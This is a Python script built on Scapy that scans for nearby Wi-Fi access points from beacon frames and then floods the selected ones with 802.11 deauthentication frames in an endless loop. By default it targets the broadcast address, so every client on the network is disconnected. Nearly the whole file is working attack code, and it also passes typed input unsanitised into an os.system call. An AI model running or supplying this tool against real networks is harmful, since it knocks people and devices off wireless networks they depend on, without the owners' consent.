# To make this file compatible with linux comment out the channel selection code

from scapy.all import *
from datetime import datetime
import sys
import time
import subprocess
import os

client = "FF:FF:FF:FF:FF:FF" # Use FF:FF:FF:FF:FF:FF to deauth everyone on that network. Use a specific mac address to only deauth a certain device
found = {}

if len(sys.argv) < 2:
  print("usage: deauth.py <iface>")
  sys.exit(-1)
conf.iface = sys.argv[1]

choice1 = input("To scan for targets press 1. \nTo manualy enter AP press 2: \n")

if choice1 == "1":
    # WARNING: The following channel selection code only works on mac. Remove to make the code linux compatible.
    # Select channel
    channel = ""
    while channel.isdigit() != True:
      channel = input("Channel to use: ")
    os.system("nohup /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + conf.iface + " sniff " + channel + " &")
    time.sleep(0.5)

    # Function to process captured packets
    def sniffmgmt(p):
      stamgmtstypes = (0, 2, 4)
      if p.haslayer(Dot11) and p.type == 0 and p.subtype == 0x08 and hasattr(p, 'info'):
        ssid = ( len(p.info) > 0 and p.info != "\x00" ) and p.info or '<hidden>'
        probe = { "ssid": ssid, "cli": p.addr2 }
        key = "%s" % (p.addr2)
        found[key] = probe

    # Capture n number of packets and use them to generate a list of available APs, their mac addresses and their SSIDs
    n = ""
    while n.isdigit() != True:
      n = input("Number of packets to capture: ")
    n = int(n)

    sniff(iface=conf.iface, prn=sniffmgmt, monitor=True, count=n)

    probe_list = []

    # Make an array version of found so that each AP has a number associated with it for the user to choose
    for key,probe in found.items():
      item = [key,probe]
      probe_list.append(item)

    # Print out the list of discovered APs and their index so that the user can choose one
    for i in range(len(probe_list)):
      item = probe_list[i]
      print(str(i) + " : " + str(item[1]["ssid"])[2:-1] + " : " + item[1]["cli"])

    # Get & process user input
    n = ""
    while n.replace(",", "").isdigit() != True:
      n = input("AP number to be deauthed: ")
    # n = int(n)

    aps = list(map(int, n.split(",")))
    print(aps)

    # Send packets forever
    while True:
      for n in aps:
        ap = probe_list[n][1]["cli"]
        print(ap)

        # Create & send packet
        packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
        sendp(packet, monitor=True) # If interface is already in monitor mode remove the monitor=true parameter

elif choice1 == "2":
    ap = input("Enter APs MAC addres: ")
    while True:
        print(ap)

        # Create & send packet
        packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
        sendp(packet, monitor=True) # If interface is already in monitor mode remove the monitor=true parameter

else:
    print("invalid option chosen")
    exit()
